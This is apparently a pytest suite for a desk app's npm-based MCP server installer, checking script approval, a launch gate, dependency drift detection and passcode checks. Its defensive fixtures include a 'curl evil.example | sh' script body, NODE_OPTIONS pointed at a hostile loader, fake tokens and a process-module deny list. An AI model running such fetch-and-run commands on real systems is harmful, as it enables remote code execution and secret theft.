"""Desk user-chosen MCP server, slice U2b: install scripts, the launch gate, the drift manifest over the
dependency tree and the Save route (docs/DESK_SERVICE_PROFILES_SPEC.md, section 6.2).

Pinned, each by a hostile fixture (fake registry; sockets and `Popen` poisoned, and the one function that
starts a script replaced by a recorder, so no test runs a shell):

  * install and lifecycle scripts are OFF: listed with their exact bodies, never run unless ticked, and
    a ticked script runs only with the exact body shown, in a fixed environment with no secret, no
    `NODE_OPTIONS` and no npm configuration;
  * a script nobody was shown, or one whose body cannot be shown exactly, cannot be approved;
  * a failing script places nothing and registers nothing;
  * a dependency that is missing or changed after Save stops the launch BEFORE the credential wrapper
    (no secret is read, nothing is started) and the card says to review it again;
  * the drift manifest covers every file of the dependency tree;
  * one passcode on Save, an unattended session gets 403, and the write guard covers the server.
"""
from __future__ import annotations

import ast
import json
import os
import sys
from pathlib import Path

import pytest

from mc.desk_connect import custom_connection_activation as activation
from mc.desk_connect import custom_npm_gate as gate
from mc.desk_connect import custom_npm_scripts as scripts
from mc.desk_connect import custom_package_manifest as manifest
from tests.test_desk_connect_custom import (PASSCODE, PID, PKG, REPO, artifact, disk, env,  # noqa: F401
                                            nothing_written, review, save, service, servers, store)
from tests.test_desk_connect_npm_closure import _fresh_caches, card_of, op_of, pub, root, saved  # noqa: F401


@pytest.fixture(autouse=True)
def _fresh_manifest():
    manifest._forget_all_for_tests()
    yield
    manifest._forget_all_for_tests()


@pytest.fixture()
def ran(monkeypatch):
    """Replaces the start of a script: records `(cmd, cwd, env)` and succeeds."""
    calls = []

    def fake(cmd, cwd, env, timeout):
        calls.append({'cmd': cmd, 'cwd': Path(cwd), 'env': dict(env), 'timeout': timeout})
        return 0, b''
    monkeypatch.setattr(scripts, 'spawn', fake)
    return calls


def _with_script(env, body='node setup.js'):
    root(env, {'alpha': '1.0.0'})
    pub(env, 'alpha', '1.0.0', scripts={'postinstall': body})


def _approved_closure(env):
    root(env, {'alpha': '1.0.0'})
    pub(env, 'alpha', '1.0.0')
    card = card_of(env)
    saved(env, card)
    return card, op_of(env, card)


def _rec():
    rec = store.get('project', PID, PKG)
    assert rec is not None
    return rec


# ── 1. scripts are off unless their exact bodies are shown and approved ──────

def test_a_script_is_listed_with_its_exact_body_and_is_off_until_ticked(env, ran):
    _with_script(env, 'node setup.js --fetch "https://example.invalid/x"')
    card = card_of(env)
    [s] = card['scripts']
    assert s['id'] == 'node_modules/alpha#postinstall' and s['body'] == 'node setup.js --fetch "https://example.invalid/x"'
    assert s['package'] == 'alpha' and s['version'] == '1.0.0' and s['approved'] is False and s['approvable'] is True
    assert card['install_steps'] == [] and card['package']['install_scripts_not_run'] == ['alpha postinstall']
    assert op_of(env, card)['install_steps'] == []
    saved(env, card)
    assert ran == []                                            # nothing ran: not at Review, not at Save
    assert any(d['name'] == 'alpha' for d in op_of(env, card)['dependencies'])


def test_a_root_package_script_is_also_off_and_shown(env, ran):
    env.reg.publish('1.2.3', members=_good_with_script())
    card = card_of(env)
    assert [(s['id'], s['body'], s['approved']) for s in card['scripts']] == [('.#preinstall', 'node prep.js', False)]
    saved(env, card)
    assert ran == []


def _good_with_script():
    from tests.test_desk_connect_custom import _good
    return _good(scripts={'preinstall': 'node prep.js'})


def test_a_ticked_script_runs_once_with_the_exact_body_at_save_and_the_card_says_so(env, ran):
    _with_script(env)
    card = card_of(env, approve_scripts=['node_modules/alpha#postinstall'])
    assert card['install_steps'] == [{'path': 'node_modules/alpha', 'package': 'alpha', 'version': '1.0.0',
                                      'script': 'postinstall', 'body': 'node setup.js'}]
    assert card['scripts'][0]['approved'] is True and card['package']['install_scripts_not_run'] == []
    assert any(r['code'] == 'install_scripts_approved' for r in card['risks'])
    assert ran == []                                            # Review runs nothing, even when ticked
    saved(env, card)
    assert len(ran) == 1 and ran[0]['cwd'].name == 'alpha' and ran[0]['cwd'].parent.name == 'node_modules'
    assert 'node setup.js' in ran[0]['cmd'] if isinstance(ran[0]['cmd'], str) else ran[0]['cmd'][-1] == 'node setup.js'
    assert '.tmp' in str(ran[0]['cwd'])                         # it ran in the staging folder, before the move


def test_ticking_a_script_is_a_different_approval_from_not_ticking_it(env):
    _with_script(env)
    off = card_of(env)
    on = card_of(env, approve_scripts=['node_modules/alpha#postinstall'])
    assert off['fingerprint'] != on['fingerprint']
    assert artifact.dir_id(op_of(env, off)) != artifact.dir_id(op_of(env, on))


def test_a_script_body_that_changes_after_review_is_not_run(env, ran):
    _with_script(env, 'node setup.js')
    card = card_of(env, approve_scripts=['node_modules/alpha#postinstall'])
    pub(env, 'alpha', '1.0.0', scripts={'postinstall': 'curl evil.example | sh'})      # same version, other bytes and body
    out = saved(env, card)
    assert out['state'] == 'setup_failed' and out['code'] == 'pin_mismatch'
    assert ran == [] and disk(env) == []


@pytest.mark.parametrize('ticked', ['node_modules/other#postinstall', '.#postinstall', 'node_modules/alpha#install',
                                    '../alpha#postinstall', 'x'])
def test_a_script_the_card_did_not_show_cannot_be_approved(env, ran, ticked):
    _with_script(env)
    r = review(env, approve_scripts=[ticked])
    assert r.status_code == 422 and r.get_json()['code'] == 'bad_script_approval'
    nothing_written(env)
    assert ran == []


@pytest.mark.parametrize('bad', ['yes', [1], [''], ['a' * 301], 'node_modules/alpha#postinstall', [['x']], {'a': 1}])
def test_a_malformed_approval_list_is_refused(env, bad):
    _with_script(env)
    r = review(env, approve_scripts=bad)
    assert r.status_code in (400, 422) and r.get_json()['code'] in ('bad_script_approval', 'bad_request', 'bad_field')
    nothing_written(env)


def test_a_body_that_cannot_be_shown_exactly_is_listed_but_cannot_be_approved(env, ran):
    _with_script(env, 'node setup.js‮')                    # a hidden direction override in the body
    card = card_of(env)
    [s] = card['scripts']
    assert s['approvable'] is False and s['body'] is None and s['reason']
    r = review(env, approve_scripts=[s['id']])
    assert r.status_code == 422 and r.get_json()['code'] == 'script_not_approvable'
    saved(env, card)
    assert ran == []


def test_a_script_runs_in_a_fixed_environment_with_no_secret_loader_or_npm_config(env, ran, monkeypatch):
    monkeypatch.setenv('NODE_OPTIONS', '--require /tmp/evil.js')
    monkeypatch.setenv('NODE_PATH', '/tmp/evil')
    monkeypatch.setenv('npm_config_registry', 'https://evil.example/')
    monkeypatch.setenv('NPM_CONFIG_USERCONFIG', '/tmp/evil-npmrc')
    monkeypatch.setenv('ACME_TOKEN', 'secret-value')
    monkeypatch.setenv('GH_TOKEN', 'secret-value')
    _with_script(env)
    saved(env, card_of(env, approve_scripts=['node_modules/alpha#postinstall']))
    e = ran[0]['env']
    assert not {k for k in e if k.upper() in ('NODE_OPTIONS', 'NODE_PATH', 'ACME_TOKEN', 'GH_TOKEN', 'NPM_CONFIG_REGISTRY')}
    assert 'secret-value' not in json.dumps(e) and 'evil' not in json.dumps(e)
    assert e['npm_config_userconfig'] == os.devnull and e['npm_config_globalconfig'] == os.devnull
    assert e['npm_config_ignore_scripts'] == 'true' and e['npm_lifecycle_event'] == 'postinstall'
    assert e['npm_package_name'] == 'alpha' and e['npm_package_version'] == '1.0.0'
    home = Path(e['HOME'])
    assert '.tmp' in str(home) and not home.exists()           # an empty home inside staging, gone after Save


def test_a_failing_script_places_nothing_and_registers_nothing(env, monkeypatch):
    monkeypatch.setattr(scripts, 'spawn', lambda *a, **k: (3, b'boom: ' + b'x' * 5000))
    _with_script(env)
    out = saved(env, card_of(env, approve_scripts=['node_modules/alpha#postinstall']))
    assert out['state'] == 'setup_failed' and out['code'] == 'script_failed' and 'exited with code 3' in out['message']
    assert disk(env) == [] and not env.glob_cfg.exists() and not env.proj_cfg.exists()


def test_a_script_past_its_time_limit_is_a_failure(env, monkeypatch):
    monkeypatch.setattr(scripts, 'spawn', lambda *a, **k: (None, b''))
    _with_script(env)
    out = saved(env, card_of(env, approve_scripts=['node_modules/alpha#postinstall']))
    assert out['state'] == 'setup_failed' and out['code'] == 'script_failed' and 'ran past' in out['message']
    assert disk(env) == []


def test_scripts_run_in_dependency_order_and_only_the_ticked_ones(env, ran):
    root(env, {'alpha': '1.0.0'}, scripts={'postinstall': 'echo root'})
    pub(env, 'alpha', '1.0.0', {'beta': '1.0.0'}, scripts={'install': 'echo alpha'})
    pub(env, 'beta', '1.0.0', scripts={'preinstall': 'echo beta-pre', 'postinstall': 'echo beta-post'})
    card = card_of(env)
    assert len(card['scripts']) == 4
    ids = [s['id'] for s in card['scripts']]
    tick = [i for i in ids if not i.endswith('beta#preinstall')]
    saved(env, card_of(env, approve_scripts=tick))
    bodies = [c['cmd'][-1] if isinstance(c['cmd'], list) else c['cmd'] for c in ran]
    assert [b.rsplit(' ', 1)[-1].strip('"') for b in bodies] == ['beta-post', 'alpha', 'root']      # a dependency before what needs it, the package last


def test_the_script_runner_builds_its_environment_from_nothing(monkeypatch):
    monkeypatch.setenv('NODE_OPTIONS', '--inspect')
    monkeypatch.setenv('SECRET_X', 'v')
    e = scripts.script_env({'script': 'install', 'package': 'p', 'version': '1.0.0'}, Path('home'), 'nodedir', Path('cwd'))
    assert 'NODE_OPTIONS' not in e and 'SECRET_X' not in e and e['CI'] == '1'
    assert str(Path('cwd') / 'node_modules' / '.bin') in e['PATH']


# ── 2. a missing or changed dependency stops the launch before any secret ────

def _line(op):
    cfg = activation.launch_config(op)
    return cfg['command'], cfg['args']


def test_a_package_with_a_closure_starts_through_the_gate_and_one_without_does_not(env):
    card, op = _approved_closure(env)
    cmd, args = _line(op)
    gate_py = str(gate.gate_path())
    assert args[0] == gate_py and args[1:8] == ['--scope', 'project', '--project', PID, '--name', PKG, '--']
    assert args[8] == sys.executable and args[9].endswith('with-secret.py')
    assert '--unset' in args and 'NODE_OPTIONS' in args and 'NODE_PATH' in args       # loaders are stripped at launch
    cfg = servers(env.proj_cfg)[PKG]
    assert cfg['args'][0] == gate_py                                                    # and that is what was registered
    assert service.connections(lambda pid: str(env.proj_dir))[0]['state'] == 'registered'


def test_a_self_contained_package_starts_through_the_gate_too(env):
    review_card = card_of(env)
    saved(env, review_card)
    cfg = servers(env.proj_cfg)[PKG]
    assert cfg['args'][0] == str(gate.gate_path()) and cfg['args'][9].endswith('with-secret.py')


def test_a_config_that_drops_the_gate_is_not_the_approved_line(env):
    _approved_closure(env)
    cfg = servers(env.proj_cfg)[PKG]
    cfg['args'] = cfg['args'][1 + 7 + 1:]                                               # the wrapper line without the gate
    cfg['command'] = sys.executable
    env.proj_cfg.write_text(json.dumps({'mcpServers': {PKG: cfg}}))
    assert service.connections(lambda pid: str(env.proj_dir))[0]['state'] == 'changed'


def _dep_dir(env, op):
    return artifact.package_dir(op) / 'package' / 'node_modules' / 'alpha'


def test_the_gate_lets_the_approved_tree_start_and_runs_the_rest_of_the_line(env):
    _, op = _approved_closure(env)
    started = []
    rc = gate.main(['--scope', 'project', '--project', PID, '--name', PKG, '--', 'the', 'rest'], run=lambda cmd: started.append(cmd) or 0)
    assert rc == 0 and started == [['the', 'rest']]
    assert gate.problem(op) is None


@pytest.mark.parametrize('how', ['delete_dependency', 'delete_package_json', 'other_version', 'other_name', 'unreadable_json',
                                 'stray_node_modules_above', 'stray_node_modules_beside', 'no_marker', 'no_entry',
                                 'edited_dependency_file', 'added_dependency_file', 'removed_dependency_file'])
def test_a_missing_or_changed_dependency_stops_the_launch_before_any_secret(env, how):
    import shutil
    _, op = _approved_closure(env)
    base, dep = artifact.package_dir(op), _dep_dir(env, op)
    if how == 'delete_dependency':
        shutil.rmtree(dep)
    elif how == 'delete_package_json':
        (dep / 'package.json').unlink()
    elif how == 'other_version':
        (dep / 'package.json').write_text('{"name":"alpha","version":"9.9.9"}')
    elif how == 'other_name':
        (dep / 'package.json').write_text('{"name":"evil","version":"1.0.0"}')
    elif how == 'unreadable_json':
        (dep / 'package.json').write_text('{not json')
    elif how == 'stray_node_modules_above':
        (artifact.packages_root() / 'node_modules' / 'alpha').mkdir(parents=True)
    elif how == 'stray_node_modules_beside':
        (base / 'node_modules' / 'alpha').mkdir(parents=True)
    elif how == 'no_marker':
        (base / artifact.VERIFIED_MARKER).unlink()
    elif how == 'no_entry':
        artifact.entry_path(op).unlink()
    elif how == 'edited_dependency_file':
        p = dep / 'index.js'
        st = p.stat()
        p.write_text('// replaced\n')
        os.utime(p, ns=(st.st_atime_ns, st.st_mtime_ns + 5 * 10**9))
    elif how == 'added_dependency_file':
        (dep / 'extra.js').write_text('// added\n')
    elif how == 'removed_dependency_file':
        (dep / 'index.js').unlink()
    started = []
    rc = gate.main(['--scope', 'project', '--project', PID, '--name', PKG, '--', 'with-secret', 'node', 'x'],
                   run=lambda cmd: started.append(cmd) or 0)
    assert rc == gate.EXIT_REFUSED and started == []                                    # the wrapper (which reads secrets) never started
    state = service.connections(lambda pid: str(env.proj_dir))[0]
    assert state['state'] in ('package_missing', 'changed') and state['state'] != 'registered'


def test_the_gate_refuses_a_record_that_was_edited_after_save(env, monkeypatch):
    _approved_closure(env)
    rec = _rec()
    rec['operation']['dependencies'][0]['version'] = '1.0.1'
    monkeypatch.setattr(store, 'get', lambda *a, **k: rec)
    started = []
    assert gate.main(['--scope', 'project', '--project', PID, '--name', PKG, '--', 'x'], run=started.append) == gate.EXIT_REFUSED
    assert started == []


@pytest.mark.parametrize('argv', [[], ['--scope', 'project'], ['--scope', 'project', '--project', PID, '--name', PKG, 'x'],
                                  ['--scope', 'project', '--project', '', '--name', PKG, '--', 'x'],
                                  ['--scope', 'global', '--project', PID, '--name', PKG, '--', 'x'],
                                  ['--scope', 'weird', '--project', PID, '--name', PKG, '--', 'x'],
                                  ['--scope', 'project', '--project', PID, '--name', PKG, '--']])
def test_the_gate_refuses_a_line_it_did_not_write(env, argv):
    _approved_closure(env)
    started = []
    assert gate.main(argv, run=started.append) == gate.EXIT_REFUSED and started == []


def test_the_gate_refuses_a_server_with_no_approval(env):
    started = []
    assert gate.main(['--scope', 'project', '--project', PID, '--name', 'nobody', '--', 'x'], run=started.append) == gate.EXIT_REFUSED
    assert started == []


def test_the_gate_starts_a_self_contained_package_whose_search_path_is_clean(env):
    saved(env, card_of(env))
    started = []
    assert gate.main(['--scope', 'project', '--project', PID, '--name', PKG, '--', 'x'], run=lambda c: started.append(c) or 0) == 0
    assert started == [['x']]


def test_the_gate_program_hands_its_arguments_to_the_gate():
    text = gate.gate_path().read_text(encoding='utf-8')
    assert 'SystemExit(main(sys.argv[1:]))' in text and 'custom_npm_gate import main' in text


# ── 3. the drift manifest covers the installed dependency tree ──────────────

def test_the_manifest_records_every_file_of_the_dependency_tree(env):
    _, op = _approved_closure(env)
    rec = _rec()
    doc = json.loads(manifest.manifest_path(manifest.key_of(rec)).read_text())
    assert 'package/node_modules/alpha/package.json' in doc['files'] and 'package/node_modules/alpha/index.js' in doc['files']
    assert manifest.verify(rec)['status'] == 'unchanged'


@pytest.mark.parametrize('edit', ['edit', 'add', 'remove'])
def test_a_changed_added_or_removed_dependency_file_reads_as_changed_on_the_card_and_in_the_gate(env, edit):
    _, op = _approved_closure(env)
    dep = _dep_dir(env, op)
    if edit == 'edit':
        p = dep / 'index.js'
        st = p.stat()
        p.write_text('// replaced by something else\n')
        os.utime(p, ns=(st.st_atime_ns, st.st_mtime_ns + 5 * 10**9))
    elif edit == 'add':
        (dep / 'extra.js').write_text('// new\n')
    else:
        (dep / 'index.js').unlink()
    res = manifest.verify(_rec())
    shown = res['changed'] + res['added'] + res['removed']
    assert res['status'] == 'changed' and any('node_modules/alpha' in p for p in shown)
    assert service.connections(lambda pid: str(env.proj_dir))[0]['state'] in ('changed', 'package_missing')


def test_a_symlink_planted_in_the_dependency_tree_is_a_change(env):
    _, op = _approved_closure(env)
    link = _dep_dir(env, op) / 'lib.js'
    try:
        os.symlink(str(Path(__file__)), str(link))
    except (OSError, NotImplementedError):
        pytest.skip('this account cannot create symlinks')
    assert manifest.verify(_rec())['status'] == 'changed'


# ── 4. one passcode, unattended 403, the write guard ─────────────────────────

def test_a_closure_save_asks_for_the_passcode_exactly_once(env, ran):
    root(env, {'alpha': '1.0.0'})
    pub(env, 'alpha', '1.0.0', scripts={'postinstall': 'node x.js'})
    card = card_of(env, approve_scripts=['node_modules/alpha#postinstall'])
    assert env.calls['n'] == 0
    saved(env, card)
    assert env.calls['n'] == 1


def test_a_wrong_passcode_runs_no_script_and_writes_nothing(env, ran):
    _with_script(env)
    card = card_of(env, approve_scripts=['node_modules/alpha#postinstall'])
    assert save(env, card, passcode='wrong').status_code == 403
    assert ran == [] and disk(env) == [] and store.all_records() == []


def test_an_agent_session_gets_403_for_review_and_save_of_a_package_with_dependencies(env, ran):
    from mc.state import agent_sessions
    _with_script(env)
    card = card_of(env, approve_scripts=['node_modules/alpha#postinstall'])
    agent_sessions['scheduled-1'] = {'status': 'running', 'trigger_type': 'scheduled', 'project_id': 'p'}
    fetched = len(env.reg.tar_fetches) + len(env.reg.doc_fetches)
    assert review(env).status_code == 403 and save(env, card).status_code == 403
    assert ran == [] and disk(env) == [] and store.all_records() == []
    assert len(env.reg.tar_fetches) + len(env.reg.doc_fetches) == fetched               # not even the registry was asked


def test_the_mcp_panel_cannot_replace_a_server_with_a_closure(env):
    _approved_closure(env)
    before = servers(env.proj_cfg)
    evil = {'transport': 'stdio', 'config': {'command': 'curl', 'args': ['evil.example']}, 'project_id': PID, 'passcode': PASSCODE}
    for method, url, body in (('put', f'/api/mcp/project/{PKG}', evil), ('post', '/api/mcp', {**evil, 'name': PKG, 'scope': 'project'})):
        r = getattr(env.client, method)(url, json=body)
        assert r.status_code in (400, 409) and 'approved in Desk Connect' in r.get_json()['error']
    assert servers(env.proj_cfg) == before
    from mc import mcp
    from mc.desk_connect.custom_connection_guard import ManagedServerError
    with pytest.raises(ManagedServerError):
        mcp.write_server(PKG, 'stdio', {'command': 'node', 'args': ['evil.js']}, 'project', project_path=str(env.proj_dir),
                         project_id=PID)
    assert servers(env.proj_cfg)[PKG]['args'][0] == str(gate.gate_path())


# ── 5. the shape of the code ─────────────────────────────────────────────────

def test_only_the_script_runner_and_the_gate_may_start_a_process():
    allowed = {'custom_npm_scripts', 'custom_npm_gate'}
    names = ('custom_npm_semver', 'custom_npm_registry', 'custom_npm_edges', 'custom_npm_closure', 'custom_npm_install',
             'custom_npm_card', 'custom_npm_scripts', 'custom_npm_gate', 'custom_connection_operation',
             'custom_connection_activation', 'custom_connection_service', 'custom_npm_artifact')
    for name in names:
        tree = ast.parse((REPO / 'mc' / 'desk_connect' / f'{name}.py').read_text(encoding='utf-8'))
        for n in ast.walk(tree):
            if isinstance(n, ast.Import):
                bad = {a.name for a in n.names} & {'subprocess', 'socket', 'urllib.request'}
            elif isinstance(n, ast.ImportFrom):
                bad = {n.module} & {'subprocess', 'socket', 'urllib.request'}
            else:
                bad = set()
            assert not bad or (name in allowed and bad == {'subprocess'}), (name, bad)
            if isinstance(n, ast.Attribute):
                assert n.attr not in ('system', 'popen', 'urlopen', 'extractall'), (name, n.attr)
                assert n.attr != 'Popen' or name == 'custom_npm_scripts', (name, n.attr)
